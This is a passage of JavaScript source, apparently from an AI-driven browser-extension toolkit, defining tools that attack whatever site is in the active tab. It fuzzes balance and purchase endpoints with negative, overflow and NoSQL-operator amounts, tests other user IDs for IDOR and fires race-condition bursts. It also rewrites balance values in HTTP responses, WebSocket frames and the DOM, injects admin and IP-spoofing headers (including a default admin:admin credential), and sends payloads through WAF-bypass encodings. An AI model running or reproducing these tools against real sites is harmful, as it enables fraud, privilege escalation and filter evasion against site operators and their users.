    return `${findings.filter((f) => f.startsWith('🚨')).length} exposed source map(s)`;
  },

  balance_attack: async (params = {}) => {
    // Phase 1 — REAL ATTACK: arm the live response rewriter on the active tab.
    // Any "balance"/"credits"/"wallet"/etc field in any XHR/fetch response will
    // be STRICTLY overwritten before the page sees it (chrome.debugger Fetch).
    // This works whether or not the user supplied a URL.
    const tab = await getActiveTab();
    const tabId = tab.id;
    const interceptValue = (params.value === undefined || params.value === null) ? 1000 : params.value;
    const interceptFields = params.fields || null;
    const findings = [];
    let intercepted = false;
    try {
      const r = await bg({ type: 'START_BALANCE_INTERCEPT', tabId,
        value: interceptValue, fields: interceptFields, urlFilter: params.urlFilter || '' });
      intercepted = !!r?.ok;
      if (intercepted) {
        const fieldsStr = (r.fields || []).join('|');
        termWrite('running', `[INTERCEPT] tab ${tabId} armed → rewriting ${fieldsStr} → ${interceptValue} on every XHR/fetch response.`);
        findings.push(`✓ Live interceptor ARMED on tab ${tabId} — every "${fieldsStr}" field in every XHR/fetch response will be rewritten to ${interceptValue} before the page sees it. Refresh the page or re-open the wallet to trigger.`);
        setAttached(true);
      }
    } catch (e) {
      termWrite('error', `[INTERCEPT] failed to arm: ${e.message}`);
      findings.push(`✗ Live interceptor failed: ${e.message}`);
    }

    // Phase 2 — DISCOVERY: read real XHR/fetch traffic the tab has already produced.
    let traffic = [];
    try {
      const r = await bg({ type: 'GET_API_TRAFFIC', tabId,
        filter: 'balance|credit|wallet|coin|gem|point|amount|fund|money|me|user|account|purchase|order|reward|cashback|refund', limit: 60 });
      traffic = r?.traffic || [];
    } catch {}
    if (traffic.length) {
      findings.push(`✓ Already-observed candidate endpoints (from real user traffic):`);
      for (const t of traffic.slice(-10)) {
        findings.push(`  ${t.method} ${t.url} → ${t.status}`);
        termWrite('done', `[OBSERVED] ${t.method} ${t.url} → ${t.status}`);
      }
    }

    const url = params.url;
    if (!url) {
      if (!traffic.length) {
        findings.push('ℹ No URL provided AND no matching traffic observed yet.');
        findings.push('👉 Refresh the page or click the wallet/dashboard so the extension can intercept the real request. Then re-run.');
      }
      securityFindings.push({ type: 'balance-attack', summary: findings.join('\n'),
        raw: { intercepted, traffic, value: interceptValue } });
      return findings.join(' | ');
    }

    // Phase 3 — ACTIVE PROBE on the supplied URL. Log every URL+status to the
    // terminal AND track consecutive 404s so the agent can stop guessing.
    const method = (params.method || 'POST').toUpperCase();
    const tmpl = params.bodyTemplate || '{"amount":{{amount}}}';
    const targetUserField = params.userField;
    const myId = params.myId;
    const otherIds = params.otherIds || ['1', '2', '999999'];
    const amounts = [
      '-1000', '-999999', '-1', '-0.01', '0', '0.0001', '0.001',
      '1e10', '1e15', '999999999', '2147483647',
      '"100"', '[100]', '{"$gt":0}', '{"$ne":0}', '{"$gte":-1}',
      'null', 'true', 'undefined', 'NaN',
      '-9999999999', '-2147483648', '-2147483649',
      '9223372036854775807', '-9223372036854775808',
      '1.7976931348623157E+308', '-1.7976931348623157E+308',
      '1e308', '-1e308', '0.0000000001',
      '-0', '-0.0', '0e0', '1e-324',
      '"NaN"', '"Infinity"', '"null"', '"undefined"',
      '{"$lt":0}', '{"$lte":-1}', '{"$nin":[0]}',
      '[{"amount":-9999}]', '{"amount":{"$ne":0},"price":{"$lt":0}}',
      '-1.5', '-99.99', '0.000001',
    ];

    let consecutive404 = 0;
    const stopOnUserAction = () => {
      const m = `❌ STOP — 5 consecutive 404s on ${method} ${url}. I can't find the balance API by guessing. Please perform an action on the site (open wallet, refresh dashboard, click "buy") so I can intercept the real request. The live interceptor is already armed — once the page makes the real call, the value will be rewritten automatically.`;
      findings.push(m);
      termWrite('error', m);
      const err = new Error('NEED_USER_ACTION: ' + m);
      err.code = 'NEED_USER_ACTION';
      err.userMessage = m;
      throw err;
    };

    for (const a of amounts) {
      const body = tmpl.replace(/\{\{amount\}\}/g, a).replace(/\{\{user\}\}/g, myId || '');
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url, method,
          headers: { 'Content-Type': 'application/json' }, body, credentials: 'include' } });
        const ok = r.status >= 200 && r.status < 300;
        const sym = ok ? '🚨' : (r.status === 404 ? '∅' : '✓');
        const preview = (r.body || '').slice(0, 80).replace(/\n/g, ' ');
        findings.push(`${sym} amount=${a} → ${method} ${url} → ${r.status} ${preview}`);
        if (r.status === 404) {
          consecutive404++;
          if (consecutive404 >= 5) {
            securityFindings.push({ type: 'balance-attack', summary: findings.join('\n'),
              raw: { url, intercepted, traffic, findings, value: interceptValue } });
            stopOnUserAction();
          }
        } else {
          consecutive404 = 0;
        }
      } catch (e) {
        if (e.code === 'NEED_USER_ACTION') throw e;
        findings.push(`✗ amount=${a} → ${method} ${url} → ${e.message}`);
      }
    }

    if (targetUserField) {
      for (const uid of otherIds) {
        const body = tmpl.replace(/\{\{amount\}\}/g, '1000').replace(/\{\{user\}\}/g, uid);
        try {
          const r = await bg({ type: 'RUN_FETCH', params: { url, method,
            headers: { 'Content-Type': 'application/json' }, body, credentials: 'include' } });
          const ok = r.status >= 200 && r.status < 300;
          const sym = ok ? '🚨 IDOR' : (r.status === 404 ? '∅' : '✓');
          findings.push(`${sym} user=${uid} → ${method} ${url} → ${r.status}`);
          if (r.status === 404) {
            consecutive404++;
            if (consecutive404 >= 5) {
              securityFindings.push({ type: 'balance-attack', summary: findings.join('\n'),
                raw: { url, intercepted, traffic, findings, value: interceptValue } });
              stopOnUserAction();
            }
          } else {
            consecutive404 = 0;
          }
        } catch (e) {
          if (e.code === 'NEED_USER_ACTION') throw e;
          findings.push(`✗ user=${uid} → ${method} ${url} → ${e.message}`);
        }
      }
    }

    const raceCount = 8;
    const raceBody = tmpl.replace(/\{\{amount\}\}/g, '100').replace(/\{\{user\}\}/g, myId || '');
    try {
      const promises = Array.from({ length: raceCount }, () => bg({ type: 'RUN_FETCH',
        params: { url, method, headers: { 'Content-Type': 'application/json' }, body: raceBody, credentials: 'include' } }));
      const results = await Promise.all(promises);
      const successes = results.filter((r) => r.status >= 200 && r.status < 300).length;
      findings.push(`${successes > 1 ? '🚨 RACE' : '✓'} ${raceCount} parallel: ${successes} succeeded → ${method} ${url}`);
    } catch (e) { findings.push(`✗ race: ${e.message}`); }

    securityFindings.push({ type: 'balance-attack', summary: findings.join('\n'),
      raw: { url, intercepted, traffic, findings, value: interceptValue } });
    const vulnCount = findings.filter((f) => f.startsWith('🚨')).length;
    return `${vulnCount} balance vuln(s) on ${url}${intercepted ? '; live interceptor armed → ' + interceptValue : ''}`;
  },

  network_listener: async (params = {}) => {
    // Read what XHR/fetch the tab has actually produced — no guessing.
    const tab = await getActiveTab();
    const filter = params.filter || '';
    const limit = params.limit || 50;
    const r = await bg({ type: 'GET_API_TRAFFIC', tabId: tab.id, filter, limit });
    const traffic = r?.traffic || [];
    if (!traffic.length) {
      const total = r?.totalCaptured || 0;
      // AUTO-FALLBACK: no API traffic found — immediately switch to DOM scan + force-rewrite
      termWrite('info', `[LISTEN] No API traffic found (total captured: ${total}). Switching to DOM force-rewrite NOW...`);
      let domResult = 'DOM inject not attempted';
      try {
        const [{ result: domRes }] = await chrome.scripting.executeScript({
          target: { tabId: tab.id }, world: 'MAIN',
          func: (targetValue) => {
            const TEXT_RE = /(\$|balance|points|credits|coins|gems|wallet|funds|amount|cash)/i;
            const allEls = Array.from(document.querySelectorAll('*'));
            const candidates = allEls.filter(el => {
              if (el.children.length > 3) return false;
              const t = (el.innerText || el.textContent || '').trim();
              return TEXT_RE.test(t) && t.length > 0 && t.length < 80;
            });
            if (!candidates.length) {
              return { found: 0, msg: 'No balance/points/$ elements found in DOM yet — perform an action on the site (open wallet, click balance) to expose them.' };
            }
            if (window.__aiudForceInterval) clearInterval(window.__aiudForceInterval);
            window.__aiudForceTargets = candidates;
            window.__aiudForceInterval = setInterval(() => {
              for (const el of window.__aiudForceTargets) {
                if (el.isConnected) el.innerText = String(targetValue);
              }
            }, 100);
            const previews = candidates.slice(0, 5).map(el => {
              const tag = el.tagName + (el.id ? '#' + el.id : el.className && typeof el.className === 'string' ? '.' + el.className.trim().split(/\s+/).slice(0, 2).join('.') : '');
              return `${tag}: "${(el.innerText || el.textContent || '').trim().slice(0, 40)}"`;
            });
            return { found: candidates.length, previews, msg: `DOM force-rewrite ARMED on ${candidates.length} element(s) — rewriting to ${targetValue} every 100ms` };
          },
          args: [1000],
        });
        domResult = domRes ? domRes.msg + (domRes.previews ? ` | Elements: ${domRes.previews.join(' | ')}` : '') : 'no result';
        termWrite(domRes?.found > 0 ? 'done' : 'info', `[DOM-FORCE] ${domResult}`);
        securityFindings.push({ type: 'dom-force-rewrite', summary: domResult, raw: domRes });
      } catch (e) {
        domResult = `DOM inject failed: ${e.message}`;
        termWrite('error', `[DOM-FORCE] ${domResult}`);
      }
      const msg = `No API traffic${total ? ` matched filter "${filter}" (${total} total captured)` : ' on this tab'}. AUTO-SWITCHED to DOM force-rewrite. ${domResult}`;
      securityFindings.push({ type: 'network-listener', summary: msg, raw: { filter, total } });
      return msg;
    }
    const lines = traffic.map((t) => `${t.method} ${t.url} → ${t.status}`);
    for (const l of lines.slice(-10)) termWrite('done', `[OBSERVED] ${l}`);
    securityFindings.push({ type: 'network-listener',
      summary: `${lines.length} req(s):\n${lines.join('\n')}`, raw: { traffic } });
    return `${lines.length} real request(s) captured:\n${lines.slice(-15).join('\n')}`;
  },

  intercept_balance: async (params = {}) => {
    const tab = await getActiveTab();
    const value = (params.value === undefined || params.value === null) ? 1000 : params.value;
    const fields = params.fields || null;
    const r = await bg({ type: 'START_BALANCE_INTERCEPT', tabId: tab.id,
      value, fields, urlFilter: params.urlFilter || '' });
    if (!r?.ok) throw new Error('Failed to arm interceptor: ' + (r?.error || 'unknown'));
    const fieldList = (r.fields || []).join('|');
    setAttached(true);
    const msg = `✓ Interceptor ARMED on tab ${tab.id}. Every XHR/fetch response containing ${fieldList} will be rewritten to ${value} before the page sees it. Tell the user to refresh / reopen the wallet — the value they see will be the rewritten one. If they can then SPEND it, the server trusts client state (real bug). Use stop_intercept to disable.`;
    termWrite('running', `[INTERCEPT] ${msg}`);
    securityFindings.push({ type: 'intercept-balance', summary: msg,
      raw: { tabId: tab.id, fields: r.fields, value } });
    return msg;
  },

  stop_intercept: async () => {
    const r = await bg({ type: 'STOP_BALANCE_INTERCEPT' });
    const msg = r?.ok ? 'Interceptor stopped.' : ('Stop failed: ' + (r?.error || 'unknown'));
    termWrite('done', `[INTERCEPT] ${msg}`);
    return msg;
  },

  // ============================================================
  // SOVEREIGN POWER TOOLS — v3.3.0
  // ============================================================

  // 1) ULTRA-BALANCE — debugger rewriter + per-site MAIN-world fetch+XHR
  //    override + live [MUT] streaming. The single tool that does everything
  //    for "force balance" / "set credits" / "free items" goals.
  ultra_balance_arm: async (params = {}) => {
    const value = (params.value === undefined || params.value === null) ? 1000 : params.value;
    const fields = (params.fields && params.fields.length) ? params.fields : null;
    const tab = await getActiveTab();
    if (!tab.id || !tab.url) throw new Error('no active tab');
    let origin = '';
    try { origin = new URL(tab.url).origin; } catch {}

    // Phase A — background-side debugger rewriter (chrome.debugger Fetch domain)
    const r = await bg({ type: 'START_BALANCE_INTERCEPT', tabId: tab.id,
      value, fields, urlFilter: params.urlFilter || '' });
    if (!r?.ok) throw new Error('debugger rewriter arm failed: ' + (r?.error || 'unknown'));
    setAttached(true);

    // Phase B — per-site MAIN-world fetch+XHR override (belt-and-braces)
    const tpl = (typeof KNOWLEDGE_BASE !== 'undefined'
      && KNOWLEDGE_BASE.debuggerInterceptRecipe
      && KNOWLEDGE_BASE.debuggerInterceptRecipe.perSiteOverrideTemplate) || '';
    const f = (fields || ['balance','credits','wallet','coins','gems','points','amount','available','funds','money','cash']);
    const code = tpl
      .replace(/\{value\}/g, String(value))
      .replace(/\{fields\}/g, JSON.stringify(f))
      .replace(/\{origin\}/g, origin)
      .replace(/\{origin_json\}/g, JSON.stringify(origin));
    let injected = false;
    if (code) {
      try {
        await chrome.scripting.executeScript({
          target: { tabId: tab.id }, world: 'MAIN',
          func: (src) => { try { (new Function(src))(); } catch (e) { console.warn('aiud override err', e); } },
          args: [code],
        });
        injected = true;
      } catch (e) {
        termWrite('error', `[ULTRA] page-context override inject failed: ${e.message}`);
      }
    }

    // Phase C — start polling rrLog so [MUT] lines stream into the terminal in real time
    try { rrStartPolling(); } catch {}

    // Phase D — DOM force-rewrite fallback: scan page for balance/$ elements and
    // setInterval-rewrite them to `value` every 100ms regardless of API state.
    let domPhaseMsg = '';
    try {
      const [{ result: domRes }] = await chrome.scripting.executeScript({
        target: { tabId: tab.id }, world: 'MAIN',
        func: (targetValue) => {
          const TEXT_RE = /(\$|balance|points|credits|coins|gems|wallet|funds|amount|cash)/i;
          const allEls = Array.from(document.querySelectorAll('*'));
          const candidates = allEls.filter(el => {
            if (el.children.length > 3) return false;
            const t = (el.innerText || el.textContent || '').trim();
            return TEXT_RE.test(t) && t.length > 0 && t.length < 80;
          });
          if (!candidates.length) {
            return { found: 0, msg: 'No balance/$/points elements visible yet — perform an action on the site (open wallet, refresh dashboard) to expose them.' };
          }
          if (window.__aiudForceInterval) clearInterval(window.__aiudForceInterval);
          window.__aiudForceTargets = candidates;
          window.__aiudForceInterval = setInterval(() => {
            for (const el of window.__aiudForceTargets) {
              if (el.isConnected) el.innerText = String(targetValue);
            }
          }, 100);
          const previews = candidates.slice(0, 5).map(el => {
            const tag = el.tagName + (el.id ? '#' + el.id : el.className && typeof el.className === 'string' ? '.' + el.className.trim().split(/\s+/).slice(0, 2).join('.') : '');
            return `${tag}: "${(el.innerText || el.textContent || '').trim().slice(0, 40)}"`;
          });
          return { found: candidates.length, previews };
        },
        args: [value],
      });
      if (domRes?.found > 0) {
        domPhaseMsg = ` + DOM force-rewrite ARMED on ${domRes.found} element(s): ${(domRes.previews || []).join(' | ')}`;
        termWrite('done', `[ULTRA-DOM] Force-rewriting ${domRes.found} element(s) to ${value} every 100ms`);
      } else {
        domPhaseMsg = ` DOM scan found 0 elements — PERFORM AN ACTION ON THE SITE (open wallet / click balance) to expose them, then the rewriter will catch them.`;
        termWrite('info', `[ULTRA-DOM] ${domPhaseMsg.trim()}`);
      }
      securityFindings.push({ type: 'ultra-dom-force', summary: domPhaseMsg, raw: domRes });
    } catch (e) {
      domPhaseMsg = ` DOM phase failed: ${e.message}`;
      termWrite('error', `[ULTRA-DOM] ${domPhaseMsg}`);
    }

    const msg = `✓ ULTRA-BALANCE armed on ${origin || tab.url}. Debugger rewriter active (${(r.fields || []).length} field rules → ${value}). Page-context override ${injected ? 'INJECTED' : 'skipped'}.${domPhaseMsg} Refresh / reopen wallet — the value will be ${value} before the page sees it. Live [MUT] events will stream below.`;
    termWrite('running', `[ULTRA] ${msg}`);
    securityFindings.push({ type: 'ultra-balance',
      summary: msg, raw: { tabId: tab.id, origin, value, fields: r.fields, injected } });
    return msg;
  },

  // 2) WS BALANCE MUTATOR — rewrites incoming WebSocket frames in MAIN world
  //    BEFORE the page handler sees them. Pairs with ultra_balance_arm for
  //    sites that stream wallet over WS instead of HTTP.
  ws_balance_mutator: async (params = {}) => {
    const value = (params.value === undefined || params.value === null) ? 1000 : params.value;
    const fields = (params.fields && params.fields.length) ? params.fields
      : ['balance','balances','credits','credit','wallet','walletBalance',
         'coins','gems','points','amount','available','funds','money','cash'];
    const { id } = await getActiveTab();
    const [{ result }] = await chrome.scripting.executeScript({
      target: { tabId: id }, world: 'MAIN',
      func: (val, flds) => {
        if (window.__wsBalMut) return { already: true, hits: window.__wsBalMutHits || 0 };
        window.__wsBalMut = true;
        window.__wsBalMutHits = 0;
        const valLit = (typeof val === 'number') ? String(val) : JSON.stringify(String(val));
        const rules = flds.map((f) => ({
          re: new RegExp('"' + f + '"\\s*:\\s*[^,}\\]]+', 'gi'),
          rep: '"' + f + '":' + valLit,
          field: f,
        }));
        function mutate(data) {
          if (typeof data !== 'string') return data;
          let out = data;
          let hit = false;
          for (const r of rules) {
            const before = out;
            out = out.replace(r.re, r.rep);
            if (out !== before) {
              hit = true;
              try {
                window.postMessage({ source: 'aiud-dom-hook', kind: 'ws-mutate',
                  selector: 'WebSocket', before: before.slice(0, 80),
                  after: out.slice(0, 80), note: r.field + '→' + valLit }, '*');
              } catch {}
            }
          }
          if (hit) window.__wsBalMutHits++;
          return out;
        }
        const Orig = window.WebSocket;
        window.WebSocket = new Proxy(Orig, {
          construct(t, args) {
            const ws = new t(...args);
            const origAdd = ws.addEventListener.bind(ws);
            ws.addEventListener = function (type, listener, opts) {
              if (type === 'message' && typeof listener === 'function') {
                const wrapped = function (ev) {
                  try {
                    const mutated = mutate(ev.data);
                    if (mutated !== ev.data) {
                      const fake = new MessageEvent('message', {
                        data: mutated, origin: ev.origin, lastEventId: ev.lastEventId,
                        source: ev.source, ports: ev.ports,
                      });
                      return listener.call(this, fake);
                    }
                  } catch {}
                  return listener.call(this, ev);
                };
                return origAdd(type, wrapped, opts);
              }
              return origAdd(type, listener, opts);
            };
            // onmessage setter trap
            try {
              Object.defineProperty(ws, 'onmessage', {
                set(fn) {
                  this.__realOnMessage = fn;
                  origAdd('message', (ev) => {
                    if (!this.__realOnMessage) return;
                    try {
                      const mutated = mutate(ev.data);
                      if (mutated !== ev.data) {
                        return this.__realOnMessage.call(this, new MessageEvent('message', {
                          data: mutated, origin: ev.origin,
                        }));
                      }
                    } catch {}
                    return this.__realOnMessage.call(this, ev);
                  });
                },
                get() { return this.__realOnMessage; },
                configurable: true,
              });
            } catch {}
            return ws;
          },
        });
        return { installed: true, fields: flds, value: val };
      },
      args: [value, fields],
    });
    const msg = result?.already
      ? `WS mutator already active (${result.hits} prior frame mutation(s))`
      : `WS frame mutator installed → fields=[${fields.join(',')}] → ${value}. Any incoming WS frame containing those keys will be rewritten before the page handler sees it.`;
    termWrite('running', `[WSMUT] ${msg}`);
    securityFindings.push({ type: 'ws-balance-mutator', summary: msg, raw: { value, fields } });
    return msg;
  },

  // 3) HEADER INJECTOR PRO — finds admin/role flags in cookies+storage and
  //    arms declarativeNetRequest rules to inject privilege headers on every
  //    outgoing request to the active origin.
  header_injector_pro: async (params = {}) => {
    const tab = await getActiveTab();
    let origin = params.origin || '';
    if (!origin) { try { origin = new URL(tab.url).origin; } catch {} }
    if (!origin) throw new Error('no origin');
    const host = (() => { try { return new URL(origin).hostname; } catch { return ''; } })();

    // Phase A — scan cookies + localStorage + sessionStorage for hot flag names
    const [{ result: scan }] = await chrome.scripting.executeScript({
      target: { tabId: tab.id }, world: 'MAIN',
      func: () => {
        const out = { cookieNames: [], storageNames: [], detected: {} };
        try {
          out.cookieNames = document.cookie.split(/;\s*/).map((c) => c.split('=')[0]).filter(Boolean);
        } catch {}
        try {
          for (let i = 0; i < localStorage.length; i++) out.storageNames.push('ls:' + localStorage.key(i));
        } catch {}
        try {
          for (let i = 0; i < sessionStorage.length; i++) out.storageNames.push('ss:' + sessionStorage.key(i));
        } catch {}
        const allNames = [...out.cookieNames, ...out.storageNames];
        const hot = /^(is)?(admin|root|owner|sudo|superuser|staff|moderator|role|priv|level|tier|isPremium|premium)$/i;
        for (const n of allNames) if (hot.test(n.replace(/^(ls|ss):/, ''))) out.detected[n] = true;
        return out;
      },
    });

    // Phase B — pick headers to inject. Operator can override via params.headers.
    const headersToInject = params.headers || {
      'X-Admin': 'true',
      'X-Role': 'admin',
      'X-User-Role': 'admin',
      'X-Forwarded-For': '127.0.0.1',
      'X-Original-URL': '/admin',
      'X-Rewrite-URL': '/admin',
      'X-Custom-IP-Authorization': '127.0.0.1',
      'X-Forwarded-Host': '127.0.0.1',
      'X-Forwarded-Proto': 'https',
      'X-Real-IP': '127.0.0.1',
      'X-Remote-IP': '127.0.0.1',
      'X-Remote-Addr': '127.0.0.1',
      'X-Client-IP': '127.0.0.1',
      'X-Host': '127.0.0.1',
      'X-Trusted-IP': '127.0.0.1',
      'X-Cluster-Client-IP': '127.0.0.1',
      'X-Is-Admin': 'true',
      'X-Is-Superuser': 'true',
      'X-Is-Staff': 'true',
      'X-Is-Premium': 'true',
      'X-Superuser': 'true',
      'X-Staff': 'true',
      'X-Permission': 'admin',
      'X-Access-Level': '9999',
      'X-User-Level': 'admin',
      'X-Privilege': 'superuser',
      'X-Authorization': 'admin',
      'X-Bypass': 'true',
      'X-Debug': 'true',
      'X-Internal': 'true',
      'X-Request-From': 'internal',
      'X-Source-IP': '127.0.0.1',
      'True-Client-IP': '127.0.0.1',
      'CF-Connecting-IP': '127.0.0.1',
      'Fastly-Client-IP': '127.0.0.1',
      'X-ProxyUser-Ip': '127.0.0.1',
      'Via': '1.1 internal-proxy',
      'X-WAF-Bypass': '1',
      'Authorization': 'Basic YWRtaW46YWRtaW4=',
    };

    // Phase C — arm one declarativeNetRequest rule per header on this origin only.
    const armed = [];
    for (const [name, value] of Object.entries(headersToInject)) {
      try {
        await bg({ type: 'ADD_HEADER_RULE', rule: {
          urlFilter: host ? `||${host}^` : '*',
          requestHeaders: [{ name: name.toLowerCase(), op: 'set', value: String(value) }],
          responseHeaders: [],
        }});
        armed.push(name);
      } catch (e) {
        termWrite('error', `[HDR] ${name} failed: ${e.message}`);
      }
    }
    try { refreshHeaderRules(); } catch {}

    const detectedList = Object.keys(scan?.detected || {});
    const msg = `HEADER INJECTOR PRO armed on ${host || origin}. Injecting ${armed.length} privilege header(s): ${armed.join(', ')}. ` +
      (detectedList.length ? `Detected ${detectedList.length} hot flag(s) in storage/cookies: ${detectedList.slice(0, 8).join(', ')}.` : 'No admin/role flags found in storage — headers armed anyway.');
    termWrite('running', `[HDR] ${msg}`);
    securityFindings.push({ type: 'header-injector-pro', summary: msg,
      raw: { origin, armed, detected: scan?.detected || {} } });
    return msg;
  },

  // 4) PROTOCOL SMUGGLER — sends the same payload through 6 WAF-bypass
  //    encodings and reports which ones the WAF let through.
  protocol_smuggler: async (params = {}) => {
    if (!params.url) throw new Error('url required');
    const url = params.url;
    const method = (params.method || 'POST').toUpperCase();
    const payload = String(params.payload || '');
    const param = params.paramName || 'q';
    if (!payload) throw new Error('payload required');

    function b64(s) { try { return btoa(unescape(encodeURIComponent(s))); } catch { return s; } }
    function urlenc(s) { return encodeURIComponent(s); }
    function unicodify(s) {
      return s.split('').map((c) => /[a-zA-Z]/.test(c) ? '\\u00' + c.charCodeAt(0).toString(16).padStart(2, '0') : c).join('');
    }

    const variants = [
      { name: 'plain', body: `${param}=${urlenc(payload)}`, ct: 'application/x-www-form-urlencoded' },
      { name: 'hpp', body: `${param}=safe&${param}=${urlenc(payload)}&${param}=safe`, ct: 'application/x-www-form-urlencoded' },
      { name: 'json-nested', body: JSON.stringify({ [param]: { $ne: null, $regex: payload }, wrap: { inner: { deep: payload } } }), ct: 'application/json' },
      { name: 'b64-chain', body: JSON.stringify({ [param]: b64(b64(payload)) }), ct: 'application/json' },
      { name: 'comment-split', body: `${param}=${urlenc(payload.replace(/(.{3})/, '$1/**/'))}`, ct: 'application/x-www-form-urlencoded' },
      { name: 'unicode-norm', body: JSON.stringify({ [param]: unicodify(payload) }), ct: 'application/json' },
      { name: 'multipart', body: `--AIUD\r\nContent-Disposition: form-data; name="${param}"\r\n\r\n${payload}\r\n--AIUD--\r\n`, ct: 'multipart/form-data; boundary=AIUD' },
      { name: 'double-url-encoded', body: `${param}=${urlenc(urlenc(payload))}`, ct: 'application/x-www-form-urlencoded' },
      { name: 'hex-encoded', body: `${param}=${payload.split('').map(c=>'%'+c.charCodeAt(0).toString(16).padStart(2,'0')).join('')}`, ct: 'application/x-www-form-urlencoded' },
      { name: 'null-byte', body: `${param}=${urlenc(payload + '\x00')}`, ct: 'application/x-www-form-urlencoded' },
      { name: 'json-array', body: JSON.stringify({ [param]: [payload, payload] }), ct: 'application/json' },
      { name: 'proto-pollute', body: JSON.stringify({ '__proto__': { [param]: payload }, [param]: payload }), ct: 'application/json' },
      { name: 'chunked-b64', body: JSON.stringify({ [param]: b64(payload).match(/.{1,4}/g)?.join(' ') || payload }), ct: 'application/json' },
      { name: 'xml-wrap', body: `<?xml version="1.0"?><root><${param}>${payload.replace(/[<>&]/g, c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]))}</${param}></root>`, ct: 'application/xml' },
      { name: 'json-unicode', body: JSON.stringify({ [param]: payload.split('').map(c=>'\\u'+c.charCodeAt(0).toString(16).padStart(4,'0')).join('') }), ct: 'application/json' },
      { name: 'tab-sep', body: `${param}=${urlenc(payload.replace(/ /g, '\t'))}`, ct: 'application/x-www-form-urlencoded' },
      { name: 'newline-inject', body: `${param}=${urlenc(payload + '\r\nX-Injected: pwned')}`, ct: 'application/x-www-form-urlencoded' },
    ];

    const results = [];
    for (const v of variants) {
      try {
        const r = await bg({ type: 'RUN_FETCH', params: {
          url, method, credentials: 'include',
          headers: { 'Content-Type': v.ct },
          body: v.body,
        }});
        const status = r?.status || 0;
        const blocked = status === 403 || status === 406 || status === 419 || status === 429 || status === 451;
        const bodyHint = (r?.body || '').slice(0, 80).replace(/\s+/g, ' ');
        results.push({ variant: v.name, status, blocked, body: bodyHint });
        termWrite('done', `[SMUG] ${v.name} → ${status}${blocked ? ' BLOCKED' : ''} ${bodyHint}`);
      } catch (e) {
        results.push({ variant: v.name, status: 'ERR', error: e.message });
      }
    }
    const passed = results.filter((r) => r.status && r.status !== 'ERR' && !r.blocked && r.status < 500);
    const summary = `Tested ${variants.length} WAF-bypass encodings on ${url}. ${passed.length} passed (not blocked): ${passed.map((p) => p.variant + '=' + p.status).join(', ') || 'none'}.`;
    securityFindings.push({ type: 'protocol-smuggler', summary, raw: { url, payload, results } });
    return summary;
  },

  // 5) DOM MONITOR START — installs a MutationObserver in MAIN world that
  //    watches likely balance/credit elements and posts [HOOK] events back
  //    via window.postMessage → content.js → background → popup.
  dom_monitor_start: async (params = {}) => {
    const selectors = (params.selectors && params.selectors.length) ? params.selectors : [
      '[id*="balance" i]', '[class*="balance" i]',
      '[id*="credit" i]', '[class*="credit" i]',
      '[id*="wallet" i]', '[class*="wallet" i]',
      '[id*="coin" i]', '[class*="coin" i]',
      '[id*="gem" i]', '[class*="gem" i]',
      '[id*="point" i]', '[class*="point" i]',
      '[data-balance]', '[data-credits]', '[data-wallet]',
    ];
    const { id } = await getActiveTab();
    const [{ result }] = await chrome.scripting.executeScript({
      target: { tabId: id }, world: 'MAIN',
      func: (sels) => {
        if (window.__aiudDomMon) {
          window.__aiudDomMon.disconnect();
          window.__aiudDomMon = null;
        }
        const seen = new WeakMap();
        function snap(el) {
          try {
            const cs = (el.id ? '#' + el.id : '') ||
              (el.className && typeof el.className === 'string'
                ? '.' + el.className.split(/\s+/).filter(Boolean).slice(0, 2).join('.')
                : '') ||
              el.tagName.toLowerCase();
            const txt = (el.textContent || '').trim().slice(0, 80);
            return { selector: cs, value: txt };
          } catch { return { selector: '?', value: '' }; }
        }
        function emit(kind, el, before, after, note) {
          const s = snap(el);
          window.postMessage({ source: 'aiud-dom-hook', kind,
            selector: s.selector, before, after, note: note || s.value }, '*');
        }
        // Initial scan + record current values
        const targets = new Set();
        for (const sel of sels) {
          try {
            for (const el of document.querySelectorAll(sel)) {
              targets.add(el);
              const s = snap(el);
              seen.set(el, s.value);
              emit('target', el, '', s.value, 'initial scan');
            }
          } catch {}
        }
        // Observe text mutations + childList for dynamic re-renders
        const obs = new MutationObserver((muts) => {
          for (const m of muts) {
            const el = m.target.nodeType === 1 ? m.target : m.target.parentElement;
            if (!el) continue;
            // Check if the changed node OR an ancestor matches our selectors
            let interesting = targets.has(el);
            if (!interesting) {
              for (const sel of sels) {
                try { if (el.closest && el.closest(sel)) { interesting = true; break; } } catch {}
              }
            }
            if (!interesting) continue;
            const s = snap(el);
            const prev = seen.get(el);
            if (prev !== s.value) {
              emit('mutate', el, prev == null ? '' : String(prev), s.value, m.type);
              seen.set(el, s.value);
            }
          }
        });
        obs.observe(document.documentElement, {
          childList: true, subtree: true, characterData: true, attributes: true,
          attributeFilter: ['data-balance', 'data-credits', 'data-value'],
        });
        window.__aiudDomMon = obs;
        return { installed: true, targets: targets.size, selectors: sels.length };
      },
      args: [selectors],
    });
    const msg = `DOM monitor installed → ${result?.targets || 0} initial target element(s) under ${result?.selectors || 0} selector(s). Live [HOOK] events will stream below.`;
    termWrite('running', `[DOM] ${msg}`);
    securityFindings.push({ type: 'dom-monitor', summary: msg, raw: result || {} });
    return msg;
  },

  dom_monitor_stop: async () => {
    const { id } = await getActiveTab();
    await chrome.scripting.executeScript({ target: { tabId: id }, world: 'MAIN',
      func: () => { try { if (window.__aiudDomMon) { window.__aiudDomMon.disconnect(); window.__aiudDomMon = null; } } catch {} } });
    termWrite('done', '[DOM] monitor stopped');
    return 'DOM monitor stopped';
  },

  // 6) DOM CHECK BALANCE — scans the live DOM for the target value and confirms
  //    whether it is actually visible on screen. Required before reporting success.
  dom_check_balance: async (params = {}) => {
    const targetValue = String(params.value !== undefined ? params.value : 1000);
    const { id } = await getActiveTab();
    const [{ result }] = await chrome.scripting.executeScript({
      target: { tabId: id }, world: 'MAIN',
      func: (targetStr) => {
        const TEXT_RE = /(\$|balance|points|credits|coins|gems|wallet|funds|amount|cash)/i;
        const allEls = Array.from(document.querySelectorAll('*'));
        const candidates = allEls.filter(el => {
          if (el.children.length > 3) return false;
          const t = (el.innerText || el.textContent || '').trim();
          return t.length > 0 && t.length < 80;
        });
        const found = [...new Set(
          candidates.map(el => (el.innerText || el.textContent || '').trim()).filter(Boolean)
        )];
        // confirmed if any visible element contains the exact target string
        const confirmed = found.some(t => t === targetStr || t.includes(targetStr));
        // also check balance-labelled elements specifically
        const balanceCandidates = candidates
          .filter(el => TEXT_RE.test((el.innerText || el.textContent || '').trim()))
          .map(el => (el.innerText || el.textContent || '').trim())
          .filter(Boolean)
